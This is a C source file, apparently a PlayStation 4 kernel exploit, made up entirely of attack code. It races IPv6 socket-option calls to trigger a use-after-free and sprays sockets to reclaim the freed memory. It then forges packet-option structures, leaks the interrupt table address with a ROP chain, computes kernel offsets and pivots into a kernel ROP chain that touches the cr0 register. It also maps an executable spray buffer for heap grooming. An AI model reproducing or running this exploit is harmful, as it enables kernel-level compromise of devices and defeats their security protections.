#include <sys/types.h>
#include <stdio.h>
#include <sys/socket.h>
#include <sys/param.h>
#include <sys/cpuset.h>
#include <netinet/in.h>
#include <netinet/ip6.h>
#include <netinet6/ip6_var.h>
#include <unistd.h>
#include <time.h>
#include <errno.h>
#include <sys/mman.h>
#include <printf/printf.h>
#include <librop/pthread_create.h>
#include <ps4/errno.h>

#define new_socket() socket(AF_INET6, SOCK_DGRAM, 0)
#define IPV6_2292PKTINFO 19
#define IPV6_2292PKTOPTIONS 25
#define TCLASS_MASTER 0x13370000
#define TCLASS_SPRAY 0x41
#define TCLASS_TAINT 0x42
#define SPRAY_SIZE 32
#define SPRAY_TOTAL 512

#define set_pktopts(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_2292PKTOPTIONS, buf, len)
#define set_rthdr(s, buf, len) setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, buf, len)
#define free_pktopts(s) set_pktopts(s, NULL, 0)
#define set_pktinfo(s, buf) setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, sizeof(struct in6_pktinfo))

#define PKTOPTS_PKTINFO_OFFSET (offsetof(struct ip6_pktopts, ip6po_pktinfo))
#define PKTOPTS_RTHDR_OFFSET (offsetof(struct ip6_pktopts, ip6po_rhinfo.ip6po_rhi_rthdr))
#define PKTOPTS_TCLASS_OFFSET (offsetof(struct ip6_pktopts, ip6po_tclass))

#define GET_TCLASS(name) \
int name(int s) { \
    int v; \
    socklen_t l = sizeof(v); \
    if (getsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &v, &l)) \
        *(volatile int*)0; \
    return v; \
}

GET_TCLASS(get_tclass)
GET_TCLASS(get_tclass_2)
GET_TCLASS(get_tclass_3)

int set_tclass(int s, int val) {
    if (setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &val, sizeof(val)))
        *(volatile int*)0;
    return 0;
}

int get_pktinfo(int s, char* buf) {
    socklen_t l = sizeof(struct in6_pktinfo);
    if (getsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, buf, &l))
        *(volatile int*)0;
    return l;
}

struct opaque {
    volatile int triggered;
    volatile int padding;
    volatile int done1;
    volatile int done2;
    int master_sock;
    int kevent_sock;
    int* spray_sock;
};


void cleanup_sockets(int *sockets, int count) {
    for (int i = 0; i < count; i++) {
        if (sockets[i] >= 0) {
            close(sockets[i]);
            sockets[i] = -1;
        }
    }
}

void* use_thread(void* arg) {
    struct opaque* o = (struct opaque*)arg;
    char buf[CMSG_SPACE(sizeof(int))];
    struct cmsghdr* cmsg = (struct cmsghdr*)buf;
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = IPPROTO_IPV6;
    cmsg->cmsg_type = IPV6_TCLASS;
    *(int*)CMSG_DATA(cmsg) = 0;

    while (!o->triggered && get_tclass_2(o->master_sock) != TCLASS_SPRAY)
        if (set_pktopts(o->master_sock, buf, sizeof(buf)))
            *(volatile int*)0;

    o->triggered = 1;
    o->done1 = 1;
    return NULL;
}

void* free_thread(void* arg) {
    struct opaque* o = (struct opaque*)arg;
    while (!o->triggered && get_tclass_3(o->master_sock) != TCLASS_SPRAY) {
        if (free_pktopts(o->master_sock))
            *(volatile int*)0;
        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL); // 100us
    }
    o->triggered = 1;
    o->done2 = 1;
    return NULL;
}

void trigger_uaf(struct opaque* o) {
    o->triggered = o->padding = o->done1 = o->done2 = 0;
    pthread_t th1, th2;
    pthread_create(&th1, NULL, use_thread, o);
    pthread_create(&th2, NULL, free_thread, o);

    while (1) {
        for (int i = 0; i < SPRAY_SIZE; i++)
            set_tclass(o->spray_sock[i], TCLASS_SPRAY);

        if (get_tclass(o->master_sock) == TCLASS_SPRAY)
            break;

        for (int i = 0; i < SPRAY_SIZE; i++)
            if (free_pktopts(o->spray_sock[i]))
                *(volatile int*)0;

        nanosleep("\0\0\0\0\0\0\0\0\xa0\x86\1\0\0\0\0\0", NULL);
    }

    o->triggered = 1;
    while (!o->done1 || !o->done2);
}

// Construct a fake IPv6 routing header
int build_rthdr_msg(char* buf, int size) {
    int len = ((size / 8) - 1) & ~1;
    size = (len + 1) * 8;
    struct ip6_rthdr* rthdr = (struct ip6_rthdr*)buf;
    rthdr->ip6r_nxt = 0;
    rthdr->ip6r_len = len;
    rthdr->ip6r_type = IPV6_RTHDR_TYPE_0;
    rthdr->ip6r_segleft = rthdr->ip6r_len / 2;
    return size;
}

// Use spray to force reuse of freed memory (UAF)
int fake_pktopts(struct opaque* o, int overlap_sock, int tclass0, unsigned long long pktinfo) {
    free_pktopts(overlap_sock);
    char buf[0x100] = {0};
    int l = build_rthdr_msg(buf, 0x100);
    int tclass;

    while (1) {
        for (int i = 0; i < SPRAY_SIZE; i++) {
            *(unsigned long long*)(buf + PKTOPTS_PKTINFO_OFFSET) = pktinfo;
            *(unsigned int*)(buf + PKTOPTS_TCLASS_OFFSET) = tclass0 | i;
            if (set_rthdr(o->spray_sock[i], buf, l))
                *(volatile int*)0;
        }

        tclass = get_tclass(o->master_sock);
        if ((tclass & 0xffff0000) == tclass0)
            break;

        for (int i = 0; i < SPRAY_SIZE; i++)
            if (set_rthdr(o->spray_sock[i], NULL, 0))
                *(volatile int*)0;
    }

    return tclass & 0xffff;
}

// Invokes a string ROP to get the IDT base
unsigned long long __builtin_gadget_addr(const char*);
unsigned long long rop_call_funcptr(void(*)(void*), ...);

void sidt(unsigned long long* addr, unsigned short* size) {
    char buf[10];
    unsigned long long ropchain[14] = {
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rsi"),
        (unsigned long long)(ropchain + 13),
        __builtin_gadget_addr("mov [rsi], rax"),
        __builtin_gadget_addr("pop rsi"),
        ~7ul,
        __builtin_gadget_addr("sub rdi, rsi ; mov rdx, rdi"),
        __builtin_gadget_addr("mov rax, [rdi]"),
        __builtin_gadget_addr("pop rcx"),
        0x7d,
        __builtin_gadget_addr("add rax, rcx"),
        __builtin_gadget_addr("sidt [rax - 0x7d]"),
        __builtin_gadget_addr("pop rsp"),
        0
    };
    ((void(*)(char*))ropchain)(buf);
    *size = *(unsigned short*)buf;
    *addr = *(unsigned long long*)(buf + 2);
}


// Assign the process to a specific core
void pin_to_cpu(int cpu) {
    cpuset_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    cpuset_setaffinity(CPU_LEVEL_WHICH, CPU_WHICH_PID, getpid(), sizeof(set), &set);
}

static void reset_ipv6_opts(int s) {
    int tclass = -1;
    setsockopt(s, IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
    setsockopt(s, IPPROTO_IPV6, IPV6_RTHDR, NULL, 0);
    struct in6_pktinfo z = {0};
    setsockopt(s, IPPROTO_IPV6, IPV6_PKTINFO, &z, sizeof(z));
}

// External inputs from gadgets and ROP buffers
void (*enter_krop)(void);
extern uint64_t krop_idt_base;
extern uint64_t krop_jmp_crash;
extern uint64_t krop_ud1;
extern uint64_t krop_ud2;
extern uint64_t krop_read_cr0;
extern uint64_t krop_read_cr0_2;
extern uint64_t krop_write_cr0;
extern uint64_t krop_c3bak1;
extern uint64_t krop_c3bak2;
extern uint64_t krop_kernel_base;
extern uint64_t krop_master_sock;
extern char spray_bin[];
extern char spray_end[];

int main() {
    if (!setuid(0))
        return 179;

    for (int i = 0; i < 16; i++)
        new_socket();

    uint64_t idt_base;
    uint16_t idt_size;
    sidt(&idt_base, &idt_size);

    krop_idt_base = idt_base;
    uint64_t kernel_base = idt_base - 0x1bbb9e0;
    krop_kernel_base = kernel_base;
    krop_jmp_crash = kernel_base + 0x1c0;
    krop_read_cr0 = kernel_base + 0xa1b70;
    krop_read_cr0_2 = kernel_base + 0xa1b70;
    krop_write_cr0 = kernel_base + 0xa1b79;

    int kevent_sock = new_socket();
    int master_sock = new_socket();
    krop_master_sock = master_sock * 8;

    int spray_sock[SPRAY_TOTAL];
    for (int i = 0; i < SPRAY_TOTAL; i++) {
        spray_sock[i] = new_socket();
        if (spray_sock[i] < 0)
            *(volatile int*)0;
    }

    struct opaque o = {
        .master_sock = master_sock,
        .kevent_sock = kevent_sock,
        .spray_sock = spray_sock
    };

// The enter_krop chain is only executed after trigger_uaf() and fake_pktopts() is validated
for (int attempts = 0; attempts < 10; attempts++) {
    int overlap_idx = -1;
    for (int i = 0; i < SPRAY_SIZE; i++) {
        close(spray_sock[i]);
        spray_sock[i] = new_socket();
        if (spray_sock[i] < 0)
            *(volatile int*)0;
    }

    trigger_uaf(&o);
    set_tclass(master_sock, TCLASS_TAINT);

    for (int i = 0; i < SPRAY_SIZE; i++) {
        if (get_tclass(spray_sock[i]) == TCLASS_TAINT) {
            overlap_idx = i;
            break;
        }
    }

    if (overlap_idx < 0)
        continue;

    int overlap_sock = spray_sock[overlap_idx];
    spray_sock[overlap_idx] = new_socket();
    if (spray_sock[overlap_idx] < 0)
        *(volatile int*)0;

    // Build fake pktopts
    overlap_idx = fake_pktopts(&o, overlap_sock, TCLASS_MASTER, idt_base + 0xc2c);
    if (overlap_idx < 0)
        continue;

    overlap_sock = spray_sock[overlap_idx];
    spray_sock[overlap_idx] = new_socket();
    if (spray_sock[overlap_idx] < 0)
        *(volatile int*)0;

    // Modify pktinfo with pivot
    char buf[32];
    get_pktinfo(master_sock, buf);

    uint64_t entry_gadget = __builtin_gadget_addr("$ pivot_addr");

    *(uint16_t*)(buf + 4) = (uint16_t)entry_gadget;
    *(uint64_t*)(buf + 10) = entry_gadget >> 16;
    buf[9] = 0xee;

    krop_c3bak1 = *(uint64_t*)(buf + 4);
    krop_c3bak2 = *(uint64_t*)(buf + 12);
    krop_ud1 = *(uint64_t*)(buf + 4);
    krop_ud2 = *(uint64_t*)(buf + 12);

    set_pktinfo(master_sock, buf);

    enter_krop();
    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL);
    break; // Successful exploit run ROP Chain
    }
	
    // Map spray to ROP execution
    char* spray_start = spray_bin;
    char* spray_stop = spray_end;

	size_t spray_size = spray_stop - spray_start; // Check spray_size
	if (spray_size == 0 || spray_size > 0x10000)
    *(volatile int*)0;

    char* spray_map = mmap(0, spray_stop - spray_start, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANON, -1, 0);
    if (spray_map == MAP_FAILED)
        *(volatile int*)0;

    for (size_t i = 0; i < spray_stop - spray_start; i++)
        spray_map[i] = spray_start[i];

    // Run malloc sprays for pinned cores
	pin_to_cpu(1);
	rop_call_funcptr(spray_map, spray_sock, kernel_base); // Core 1 for spray_sock overlap

    for (int cpu = 2; cpu < 7; cpu++) {
        pin_to_cpu(cpu);
        rop_call_funcptr(spray_map, NULL, kernel_base); // Remaining cores for malloc sprays (Heap Grooming)
    }

    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\xA0\x86\01\0\0\0", NULL); // ~100ms

    struct in6_pktinfo safe = {0};
    set_pktinfo(master_sock, (char*)&safe);

    for (int i = 0; i < SPRAY_TOTAL; i++) if (spray_sock[i] >= 0) reset_ipv6_opts(spray_sock[i]);
    reset_ipv6_opts(master_sock);
    reset_ipv6_opts(kevent_sock);

    cleanup_sockets(spray_sock, SPRAY_TOTAL);
    close(kevent_sock);
    close(master_sock);
    munmap(spray_map, spray_size);

    nanosleep("\0\0\0\0\0\0\0\0\x00\x00\x20\xA1\07\0\0\0", NULL); // Safety exit

	return 0;
}
